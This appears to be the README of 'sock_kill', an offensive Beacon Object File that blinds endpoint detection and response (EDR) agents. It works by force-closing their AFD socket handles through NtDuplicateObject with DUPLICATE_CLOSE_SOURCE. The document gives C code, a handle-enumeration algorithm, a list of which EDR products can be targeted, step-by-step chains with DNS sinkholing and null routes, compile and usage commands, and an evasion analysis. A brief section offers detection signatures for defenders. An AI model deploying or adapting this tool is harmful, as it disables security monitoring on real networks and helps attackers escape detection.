# sock_kill — AFD Socket Handle Kill

## The Gap This Fills

NRPT sinkhole and null routing prevent EDR from **establishing new connections**
to its cloud backend. They do not terminate connections that are **already open**.

```
Timeline without sock_kill:

  T=0    EDR has live HTTPS session to defender.microsoft.com
  T=1    Install NRPT sinkhole + null route → blocks NEW connections
  T=2    EDR's existing TCP session: still alive, telemetry still flowing
  T=?    EDR closes session naturally (minutes to hours later)
  T=∞    EDR cannot reconnect (NRPT blocks DNS, null route blocks IPs)
  ✗ Gap: telemetry flowed from T=0 to T=?

Timeline with sock_kill AFTER NRPT+null_route:

  T=0    EDR has live HTTPS session to defender.microsoft.com
  T=1    Install NRPT sinkhole + null route → blocks NEW connections
  T=2    sock_kill kill MsSense.exe → OS sends TCP RST immediately
  T=2    EDR's HTTPS session dies (WSAECONNRESET on its next send/recv)
  T=∞    EDR cannot reconnect (NRPT + null route prevent it)
  ✓ Result: network blind from T=2, no latency gap
```

---

## The AFD Object Model

Windows TCP sockets are **not** raw resources owned by winsock.dll. They are
kernel object file instances managed by `afd.sys` (Ancillary Function Driver),
the NT-native socket implementation layer.

```
Application layer:
  SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    → winsock.dll calls NtCreateFile on \Device\Afd
    → afd.sys creates a FILE_OBJECT for the socket
    → kernel object manager inserts a handle into the process handle table
    → SOCKET s = opaque HANDLE value (integer)

Result:
  Process handle table:
    handle 0x1A4  →  FILE_OBJECT → afd.sys socket
    handle 0x1A8  →  FILE_OBJECT → afd.sys socket   ← another connection
    handle 0x1B0  →  SECTION     → ntdll.dll
    handle 0x1B4  →  EVENT       → some sync event
    ...

Every socket = a Windows HANDLE pointing to an afd.sys FILE_OBJECT.
```

The NT object name for every socket begins with `\Device\Afd`. This is how
we identify them without involving winsock at all — `NtQueryObject` returns
the kernel object name, bypassing any user-space socket tracking entirely.

### Object reference counting

```
                    reference count = 1 (one handle in EDR process)
EDR process:   handle 0x1A4  ─────────────────→ [AFD socket object]
                                                         │
                                                    last handle
                                                    closed = RST

After sock_kill:
EDR process:   handle 0x1A4  ✗ (closed by NtDuplicateObject CLOSE_SOURCE)
                                                         │
                                               reference count = 0
                                               afd.sys: send TCP RST
                                               connection destroyed
```

---

## NtDuplicateObject(DUPLICATE_CLOSE_SOURCE)

`NtDuplicateObject` has a flag `DUPLICATE_CLOSE_SOURCE` (value `0x1`). When
set, the kernel closes the **source handle** in the **source process** as part
of the duplication. This is the standard handle-theft primitive.

Standard usage:
```c
/* Close handle 0x1A4 in EDR process without involving the EDR process at all */
HANDLE hLocal = NULL;
NtDuplicateObject(
    hEdrProcess,       /* source process — the EDR */
    (HANDLE)0x1A4,     /* handle to close in the EDR */
    GetCurrentProcess(),   /* target process — us */
    &hLocal,           /* we get a copy (to close locally) */
    0, 0,
    DUPLICATE_CLOSE_SOURCE  /* close the source handle in hEdrProcess */
);
/* hLocal is now a dup of the socket handle; the EDR's handle is gone */
NtClose(hLocal);   /* close our copy — now refcount = 0 → RST */
```

Privilege requirement: `PROCESS_DUP_HANDLE` on the target process.

This is significantly weaker than `PROCESS_VM_WRITE` (required for memory
patching techniques like etwpatch). Standard Admin access grants
`PROCESS_DUP_HANDLE` for non-PPL processes.

---

## System Handle Enumeration

To find which handles in the EDR process are sockets, we use
`NtQuerySystemInformation(SystemExtendedHandleInformation = 64)`.

This returns **all handles across all processes** in a flat array:

```c
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID     Object;              /* kernel object pointer (KASLR offset) */
    ULONG_PTR UniqueProcessId;     /* owner PID */
    ULONG_PTR HandleValue;         /* handle value in owner's table */
    ULONG     GrantedAccess;       /* access mask */
    USHORT    CreatorBackTraceIndex;
    USHORT    ObjectTypeIndex;     /* 0x25 = File (which includes sockets) */
    ULONG     HandleAttributes;
    ULONG     Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
```

Algorithm:
```
1. Call NtQuerySystemInformation(64, buf, size, &needed)
   → if STATUS_INFO_LENGTH_MISMATCH: realloc to needed + slack, retry
   → on success: buf contains ALL handles system-wide

2. Iterate entries:
   if entry.UniqueProcessId != targetPid: skip

3. For each handle owned by targetPid:
   a. Duplicate with GENERIC_READ (inspection copy, no CLOSE_SOURCE)
   b. NtQueryObject(dup, ObjectNameInformation=1) → NT object name
   c. Check: does name start with "\Device\Afd"?
   d. If yes: close dup, then DUPLICATE_CLOSE_SOURCE on original
   e. If no: close dup, continue
```

Buffer size starts at 1 MB and grows exponentially on `STATUS_INFO_LENGTH_MISMATCH`.
On a loaded system with many processes, this can be 10–30 MB.

---

## Two-Phase Handle Access

Each socket requires two separate `NtDuplicateObject` calls:

### Phase 1: Identification (read-only)

```c
HANDLE hInspect;
NtDuplicateObject(
    hEdrProcess,
    (HANDLE)entry->HandleValue,
    GetCurrentProcess(),
    &hInspect,
    GENERIC_READ, 0,
    0              /* no CLOSE_SOURCE — we want to READ first */
);

// Query the NT object name
OBJECT_NAME_INFORMATION nameInfo;
NtQueryObject(hInspect, ObjectNameInformation, &nameInfo, sizeof(nameInfo), NULL);
// nameInfo.Name.Buffer = L"\\Device\\Afd\\Endpoint" (or similar)

NtClose(hInspect);  // close inspection copy — EDR's handle untouched
```

### Phase 2: Destruction (kill mode only)

```c
HANDLE hKill;
NtDuplicateObject(
    hEdrProcess,
    (HANDLE)entry->HandleValue,
    GetCurrentProcess(),
    &hKill,
    0, 0,
    DUPLICATE_CLOSE_SOURCE  /* close EDR's handle as part of dup */
);
// hEdrProcess no longer has this socket handle
// hKill is now the only reference to the AFD object
NtClose(hKill);
// reference count = 0 → afd.sys sends TCP RST → connection terminated
```

---

## What Happens Inside afd.sys

When the last handle to a socket FILE_OBJECT is closed, `afd.sys` receives
a close IRP (IRP_MJ_CLOSE) from the I/O manager. For a connected TCP socket:

```
IRP_MJ_CLOSE → AfdCleanup()
  → AfdAbortConnection()
    → TCP send RST segment (if any data pending: discard and RST)
    → Remote side receives RST: connection torn down
    → Any pending recv() in the EDR process: returns WSAECONNRESET
    → Any pending send(): returns WSAECONNRESET
    → TCP state machine: ESTABLISHED → CLOSED (no TIME_WAIT, no FIN)
```

The EDR process:
- Was blocked in `recv()` waiting for cloud response → unblocks immediately
  with `WSAECONNRESET` error
- Had a background upload thread → next `send()` returns `WSAECONNRESET`
- Connection watchdog thread → sees error, tries to reconnect
  → DNS lookup fails (NRPT sinkhole) or connect() fails (null route)
  → EDR enters disconnected mode

---

## Socket Identification — Why NT Names Work

Standard winsock has a per-process socket table that maps `SOCKET` integers
to internal structures. Accessing another process's socket table requires
reading its memory (`PROCESS_VM_READ`) — a stronger privilege than we need.

`NtQueryObject(ObjectNameInformation)` returns the kernel-level object name,
which is stored in the kernel object header, not in any user-mode structure.
This works with just a duplicated handle — no memory reads in the target.

```
EDR process address space:        Kernel object manager:
  ┌────────────────────┐           ┌─────────────────────────────┐
  │ SOCKET s = 0x1A4   │──────────→│ OBJECT_HEADER               │
  │ winsock state...   │           │   Name = "\Device\Afd\00001" │
  └────────────────────┘           │   RefCount = 1               │
                                   │   Type = File                │
  We need NO ACCESS to             └─────────────────────────────┘
  the winsock state.                          ↑
  We only need a dup               NtQueryObject reads from here.
  handle to query the              No read in EDR process required.
  kernel object header.
```

---

## PPL Compatibility Matrix

| EDR Product | Process | PPL Level | sock_kill? | Alternative |
|-------------|---------|-----------|-----------|-------------|
| Microsoft Defender for Endpoint | MsSense.exe | PPL-Antimalware | **No** | nrpt_sinkhole + null_route |
| CrowdStrike Falcon | csagent.exe / CSFalconService.exe | PPL-Antimalware | **No** | nrpt_sinkhole + null_route |
| SentinelOne | SentinelAgent.exe | Non-PPL | **Yes** | — |
| Elastic EDR | elastic-endpoint.exe | Non-PPL | **Yes** | — |
| Carbon Black | cb.exe / cbdefense.exe | Non-PPL | **Yes** | — |
| CylancePROTECT | CylanceSvc.exe | Non-PPL | **Yes** | — |
| Sophos | SophosEDR.exe | Non-PPL | **Yes** | — |
| Windows Defender (standalone) | MsMpEng.exe | PPL-Antimalware | **No** | nrpt_sinkhole + null_route |

PPL (Protected Process Light) sets `PS_PROTECTION` on the process object.
This causes the kernel to deny `PROCESS_DUP_HANDLE` access when the caller
is not also a PPL process. `OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid)`
returns `ERROR_ACCESS_DENIED` (5) for PPL targets.

For PPL EDRs, NRPT + null_route still work because they operate at the
network stack level, not the process handle level. The existing connection
will eventually drop naturally, and reconnect attempts will fail permanently.

---

## Operational Sequence

### Full network blocking chain (non-PPL EDR)

```
# Step 1: Block new DNS connections (persistent)
nrpt_sinkhole *.sentinelone.net;*.pax.sentinelone.net

# Step 2: Block known IPs (persistent)
null_route 54.80.0.1;3.213.0.1

# Step 3: Kill existing connections NOW (one-shot)
sock_kill kill SentinelAgent.exe

# Optional: QoS failsafe for any leaked IPs
edrchoker SentinelAgent.exe;SentinelServiceHost.exe
```

Result: EDR is network-blind within seconds of Step 3. No gap where
telemetry keeps flowing between "rules installed" and "connection drops."

### Elastic EDR full chain

```
# Enumerate first
sock_kill list elastic-endpoint.exe

# Block DNS
nrpt_sinkhole *.elastic.co;*.fleet.elastic.co;*.apm.elastic.co

# Block IPs (Elastic uses AWS ELBs — resolve fleet endpoint first)
null_route <resolved_ips>

# Kill active connections
sock_kill kill elastic-endpoint.exe
```

### Multiple targets simultaneously

```
sock_kill kill SentinelAgent.exe;elastic-endpoint.exe;cb.exe
```

---

## Detection Profile

### What is visible

| Artifact | Visibility | Notes |
|----------|-----------|-------|
| `OpenProcess(PROCESS_DUP_HANDLE)` syscall | Moderate | Less suspicious than VM_WRITE access |
| `NtQuerySystemInformation(64)` | Low | Normal system monitoring activity |
| `NtDuplicateObject` calls | Low | Common across many legitimate tools |
| TCP RST packet in network capture | Low | Looks like a normal connection reset |
| EDR process log: `WSAECONNRESET` | Internal | EDR-side artifact, not externally visible |

### What is NOT visible

- No registry modifications (unlike NRPT, null_route, edrchoker)
- No WFP filter events (unlike wfp_filter_purge)
- No route table entries (unlike null_route)
- No firewall rule changes
- No driver loading

The only persistent side-effect is a TCP RST packet on the wire, which is
indistinguishable from a normal network error unless correlated with other
activity.

### EDR's own detection capability

Some EDRs monitor their own handle table for unexpected closures. However:
- This monitoring requires reading the handle table periodically, which has
  a polling interval
- sock_kill operates faster than typical polling cycles (milliseconds vs seconds)
- The EDR's monitoring thread also cannot react if its network connection is
  already gone (it can't phone home to alert)

---

## Detection Signatures for Defenders

### SIEM: handle duplication on EDR process

```sql
-- Sysmon Event ID 10 (ProcessAccess) on EDR processes
event.code == "10"
AND target_process.name in ("SentinelAgent.exe", "elastic-endpoint.exe", "cb.exe")
AND call.requestedAccess contains "PROCESS_DUP_HANDLE"
AND NOT call.sourceImage in known_admin_tools
```

### ETW: Microsoft-Windows-Kernel-Process

Provider: `Microsoft-Windows-Kernel-Process`
Event: `KERNEL_HANDLE_EVENT` — look for handle close events on `\Device\Afd`
objects from a foreign process context.

### Network: correlate RST spikes with process activity

If an EDR reports TCP RST errors on its cloud connection at the same time
a new process opens it with `PROCESS_DUP_HANDLE`, this is high-confidence
sock_kill usage.

---

## Compilation

```bash
# MinGW (preferred for BOFs)
x86_64-w64-mingw32-gcc -o sock_kill.x64.o -c sock_kill.bof.c -masm=intel

# MSVC
cl /c /TC /GS- /Fosock_kill.x64.obj sock_kill.bof.c
```

No additional libraries needed — all imports are via `DECLSPEC_IMPORT`
BOF import syntax.

---

## Usage (CNA)

```
# Enumerate sockets (read-only, no changes)
sock_kill list MsSense.exe
sock_kill list SentinelAgent.exe

# Kill all connections (TCP RST)
sock_kill kill elastic-endpoint.exe
sock_kill kill SentinelAgent.exe

# Multiple targets
sock_kill kill SentinelAgent.exe;elastic-endpoint.exe;cb.exe
```

---

## Why This Is Novel

The `NtDuplicateObject(DUPLICATE_CLOSE_SOURCE)` primitive for socket handle
termination is not new in concept — it was the original design of "handle
theft" attacks. However, applying it specifically to:

1. **Socket identification via NT object names** (bypassing winsock entirely)
2. **Mass-closure of all sockets in an EDR process** (not stealing one handle
   but systematically closing all of them)
3. **As a network-blocking primitive** (combined with NRPT+null_route for
   a complete "dead and can't reconnect" state)

is a novel operational pattern not documented in public red team tooling as
of mid-2026. Standard network blocking tools (WFP, firewall, routing) all
leave persistent artifacts. sock_kill leaves only a TCP RST.
